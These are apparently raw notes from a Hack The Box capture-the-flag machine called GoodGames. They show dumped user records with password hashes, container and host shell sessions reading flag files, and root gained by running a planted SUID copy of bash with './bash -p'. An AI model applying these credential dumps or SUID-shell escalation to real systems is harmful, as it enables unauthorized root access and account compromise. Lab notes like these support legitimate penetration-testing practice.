admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec 
test:test@test:cc03e747a6afbbcbf8be7668acfebee5 
asd:asdsa@gmail.com:e8ccee95f8c146c97b0b037283eb7868




root@3a453ab39d3d:/home/augustus# ls
user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt 
10c72969367b1c0f870344189e5bf40f
root@3a453ab39d3d:/home/augustus# hostname -I
172.19.0.2 
root@3a453ab39d3d:/home/augustus# 




augustus@GoodGames:~$ ./bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
6806494c8897a3ab96bd8bced896c299
bash-5.0# ls -la
total 1168
drwxrwxrwx 2 root     root        4096 Oct 13 08:51 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1168776 Oct 13 08:51 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Oct 13 06:41 user.txt
bash-5.0# 
